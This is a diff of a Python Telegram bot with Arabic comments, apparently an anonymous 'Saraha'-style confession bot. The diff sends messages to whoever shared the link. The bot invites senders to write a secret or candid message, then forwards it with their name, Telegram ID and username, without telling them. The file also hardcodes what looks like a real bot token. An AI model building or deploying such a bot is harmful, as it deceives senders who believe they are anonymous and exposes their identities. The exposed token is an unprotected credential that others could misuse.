@@ -5,7 +5,7 @@ from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, Comma
 TOKEN = "8682801321:AAH6D6o_A6-4JLhbLP5aNCOWoa4Afo0gv7k"
 MY_ADMIN_ID = 8820368378
 
-# قائمة بسيطة لتخزين الأيدي المحظورة
+# قائمة المحظورين
 blocked_users = set()
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -15,9 +15,25 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
         
     bot_username = context.bot.username
-    # إنشاء رابط صارحني الخاص بالمستخدم
-    user_link = f"https://t.me/{bot_username}?start={user_id}"
+    args = context.args
     
+    # إذا دخل عن طريق رابط شخص ثاني (صارحني)
+    if args:
+        try:
+            target_id = int(args[0])
+            if target_id == user_id:
+                await update.message.reply_text("لا يمكنك إرسال صراحة لنفسك! 😅\n\nهذا هو رابطك الخاص:\nhttps://t.me/" + bot_username + "?start=" + str(user_id))
+                return
+                
+            # حفظ الأيدي المستهدف مؤقتاً في المحادثة
+            context.user_data['target_id'] = target_id
+            await update.message.reply_text("أهلاً بك! اكتب رسالة الصراحة أو السرية الخاصة بك، وسأقوم بإرسالها للشخص فوراً 🥷✨")
+            return
+        except ValueError:
+            pass
+
+    # إذا دخل البوت بشكل عادي بدون رابط
+    user_link = f"https://t.me/{bot_username}?start={user_id}"
     await update.message.reply_text(
         f"أهلاً بك في بوت صارحني الشامل 🥷✨\n\n"
         f"هذا هو رابط الصراحة الخاص بك، شاركه مع أصدقائك ليتلقوا رسائل صراحة منك:\n{user_link}"
@@ -56,29 +72,38 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message or not update.message.text:
         return
         
-    sender_id = update.message.from_user.id
+    sender = update.message.from_user
+    sender_id = sender.id
     
     if sender_id in blocked_users:
         await update.message.reply_text("عذراً، أنت محظور ولا يمكنك إرسال رسائل.")
         return
 
-    sender_username = update.message.from_user.username
-    sender_name = update.message.from_user.first_name
+    sender_username = f"@{sender.username}" if sender.username else "لا يوجد"
+    sender_name = sender.first_name if sender.first_name else "مجهول"
     message_text = update.message.text
+
+    # التحقق مما إذا كان يرسل صراحة لشخص معين عبر رابط
+    target_id = context.user_data.get('target_id', MY_ADMIN_ID)
 
     # رد للمرسل
     await update.message.reply_text("تم إرسال صراحتك بنجاح 🥷✨")
 
-    # إرسال الرسالة للإدارة مع التقرير الكامل
+    # إرسال الرسالة والتقرير الكامل للشخص المستهدف (أو لكِ إذا كانت موجهة لكِ)
     await context.bot.send_message(
-        chat_id=MY_ADMIN_ID,
+        chat_id=target_id,
         text=f"💌 وصلت صراحة جديدة!\n\n"
              f"💬 النص:\n{message_text}\n\n"
              f"👤 معلومات المرسل:\n"
              f"- الاسم: {sender_name}\n"
-             f"- الأيدي: {sender_id}\n"
-             f"- اليوزر: @{sender_username if sender_username else 'لا يوجد'}"
+             f"- الأيدي: `{sender_id}`\n"
+             f"- اليوزر: {sender_username}",
+        parse_mode="Markdown"
     )
+    
+    # مسح المستهدف المؤقت لكي لا تتخزن الرسالة بالغلط
+    if 'target_id' in context.user_data:
+        del context.user_data['target_id']
 
 if __name__ == '__main__':
     application = ApplicationBuilder().token(TOKEN).build()
